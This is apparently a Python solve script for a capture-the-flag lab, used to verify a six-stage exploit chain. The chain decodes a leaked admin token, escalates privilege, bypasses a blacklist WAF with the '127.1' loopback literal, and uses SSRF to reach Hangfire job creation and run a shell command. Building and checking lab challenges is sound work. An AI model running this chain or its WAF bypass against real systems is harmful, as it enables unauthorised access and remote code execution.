#!/usr/bin/env python3
"""
VaultCorp — automated end-to-end solve / verification script.

Replays the full intended 6-stage exploit chain against a running instance
of the lab and asserts that the real flag is recovered. This exists as
evidence for the challenge intake review, and as a regression check that
future changes to the app don't silently break the solve path.

Stages reproduced:
  1. Register a normal (lowest-privilege) account.
  2. As that account, fetch the per-tenant "/js/user-utils.js" fixture and
     recover the Admin's "LocalId:tk_<ApiToken>" pair, which is leaked
     client-side XOR(0x42)+Base64 "obfuscated" among 2 decoy entries.
  3. Use that pair against "/support_login" to escalate to the tenant's
     Admin session (the endpoint does not check the leaked token belongs
     to the caller's own tenant/account by looking at the session scope,
     only that LocalId+ApiToken match some Admin row).
  4. As Admin, abuse "/admin/import" (SSRF) to reach the Hangfire
     dashboard's unauthenticated job-creation internal API, which trusts
     any loopback-originated request (CVE-2021-41238 pattern). The naive
     string-blacklist WAF in front of the SSRF sink is bypassed with the
     alternate loopback literal "127.1".
  5. Create a Hangfire job that runs "cat /app/flag.txt" via
     CommandExecutorJob, writing output into wwwroot.
  6. Fetch the resulting static file and extract the flag.

Usage:
    python3 verify_solve.py [--base-url http://localhost:5000] [--expect-flag duck{...}]

Exit code 0 means the chain succeeded and (if --expect-flag was given) the
recovered flag matched exactly. Any failure raises and exits non-zero.
"""

from __future__ import annotations

import argparse
import base64
import random
import re
import string
import sys
import time
import urllib.parse

import requests

TOKEN_RE = re.compile(
    r'name="__RequestVerificationToken"[^>]*value="([^"]+)"'
)
FIXTURE_RE = re.compile(
    r'\{n:"(?P<n>[^"]*)",e:"(?P<e>[^"]*)"\}'
)
FLAG_RE = re.compile(r"duck\{[a-z0-9_]{16,40}\}")

XOR_KEY = 0x42


def log(msg: str) -> None:
    print(f"[*] {msg}", flush=True)


def ok(msg: str) -> None:
    print(f"[+] {msg}", flush=True)


def fail(msg: str) -> "NoReturn":
    print(f"[-] {msg}", file=sys.stderr, flush=True)
    sys.exit(1)


def random_str(n: int, alphabet: str = string.ascii_lowercase + string.digits) -> str:
    return "".join(random.choice(alphabet) for _ in range(n))


def extract_af_token(html: str, context: str) -> str:
    m = TOKEN_RE.search(html)
    if not m:
        fail(f"could not find antiforgery token on {context}")
    return m.group(1)


def decode_fixture_entry(enc: str) -> str:
    """Reverse the site's XOR(0x42) + Base64 'obfuscation'."""
    raw = base64.b64decode(enc)
    return bytes(b ^ XOR_KEY for b in raw).decode("utf-8", errors="replace")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://localhost:5000")
    parser.add_argument("--expect-flag", default=None,
                         help="If given, script exits non-zero unless the recovered flag matches exactly.")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--poll-attempts", type=int, default=15)
    parser.add_argument("--poll-interval", type=float, default=1.0)
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    s = requests.Session()
    s.headers.update({"User-Agent": "vaultcorp-verify-solve/1.0"})

    # ── Stage 1: Register a normal account ──────────────────────────────
    log("Stage 1/6: registering a new low-privilege account")
    r = s.get(f"{base}/register", timeout=args.timeout)
    r.raise_for_status()
    token = extract_af_token(r.text, "/register")

    username = "solver_" + random_str(10)
    password = random_str(20)
    r = s.post(
        f"{base}/register",
        data={
            "username": username,
            "password": password,
            "__RequestVerificationToken": token,
        },
        timeout=args.timeout,
    )
    r.raise_for_status()
    if "/dashboard" not in r.url.lower() and "dashboard" not in r.text.lower():
        fail(f"registration did not land on the dashboard (ended up at {r.url})")
    ok(f"registered '{username}' and obtained an Employee session")

    # ── Stage 2: Recover the leaked Admin credential pair ───────────────
    log("Stage 2/6: fetching /js/user-utils.js and decoding the leaked fixtures")
    r = s.get(f"{base}/js/user-utils.js", timeout=args.timeout)
    r.raise_for_status()
    entries = FIXTURE_RE.findall(r.text)
    if len(entries) != 3:
        fail(f"expected 3 fixture entries in user-utils.js, found {len(entries)}")

    prod_enc = None
    for name, enc in entries:
        if name == "prod":
            prod_enc = enc
            break
    if prod_enc is None:
        fail("no 'prod' entry found among the fixture array")

    decoded = decode_fixture_entry(prod_enc)
    ok(f"decoded 'prod' fixture -> {decoded}")

    m = re.match(r"^(\d+):tk_(.+)$", decoded)
    if not m:
        fail(f"decoded fixture did not match expected '<LocalId>:tk_<ApiToken>' shape: {decoded!r}")
    admin_local_id, admin_api_token = m.group(1), m.group(2)
    ok(f"recovered Admin LocalId={admin_local_id}, ApiToken={admin_api_token}")

    # ── Stage 3: Escalate via /support_login ─────────────────────────────
    log("Stage 3/6: escalating to the Admin session via /support_login")
    r = s.get(f"{base}/support_login", timeout=args.timeout)
    r.raise_for_status()
    token = extract_af_token(r.text, "/support_login")

    r = s.post(
        f"{base}/support_login",
        data={
            "refId": admin_local_id,
            "token": f"tk_{admin_api_token}",
            "__RequestVerificationToken": token,
        },
        timeout=args.timeout,
    )
    r.raise_for_status()
    if "admin" not in r.url.lower() and "admin" not in r.text.lower():
        fail(f"support_login did not appear to grant Admin access (ended up at {r.url})")
    ok("now holding an Admin session")

    # ── Stage 4 & 5: SSRF -> Hangfire job creation -> RCE ───────────────
    log("Stage 4/6: fetching /admin/import to collect its antiforgery token")
    r = s.get(f"{base}/admin/import", timeout=args.timeout)
    r.raise_for_status()
    token = extract_af_token(r.text, "/admin/import")

    out_file = f"verify_{random_str(10)}.txt"
    job_type = "VaultCorp.Jobs.CommandExecutorJob,VaultCorp"
    inner_params = {
        "type": job_type,
        "method": "Run",
        "arg0": "cat /app/flag.txt",
        "arg1": out_file,
    }
    # "127.1" is a valid alternate literal for 127.0.0.1 that the app's
    # naive string-blacklist WAF (which only matches "127.0.0.1",
    # "localhost", "0.0.0.0", "::1", "[::1]", "0177.0.0.1") does not catch,
    # while still resolving to loopback for the IPAddress.IsLoopback()
    # check done server-side on the Hangfire job-creation endpoint.
    inner_url = f"http://127.1:5000/internal/api/create?{urllib.parse.urlencode(inner_params)}"

    log("Stage 5/6: submitting the SSRF request to create a Hangfire RCE job")
    r = s.post(
        f"{base}/admin/import",
        data={"url": inner_url, "__RequestVerificationToken": token},
        timeout=args.timeout,
    )
    r.raise_for_status()
    if "WAF_BLOCK" in r.text or "Request Blocked" in r.text:
        fail("SSRF request was blocked by the WAF — loopback bypass literal may need updating")
    ok("SSRF request to the internal Hangfire job-creation API was not blocked")

    # ── Stage 6: Fetch the command output / flag ─────────────────────────
    log("Stage 6/6: polling for the job's output file and extracting the flag")
    flag = None
    for attempt in range(1, args.poll_attempts + 1):
        r = s.get(f"{base}/{out_file}", timeout=args.timeout)
        if r.status_code == 200:
            m = FLAG_RE.search(r.text)
            if m:
                flag = m.group(0)
                break
        time.sleep(args.poll_interval)
    else:
        fail(f"output file '{out_file}' never appeared / never contained a flag "
             f"after {args.poll_attempts} attempts")

    ok(f"recovered flag: {flag}")

    if args.expect_flag is not None:
        if flag != args.expect_flag:
            fail(f"recovered flag does not match --expect-flag "
                 f"(got {flag!r}, expected {args.expect_flag!r})")
        ok("recovered flag matches --expect-flag exactly")

    print(flag)


if __name__ == "__main__":
    main()
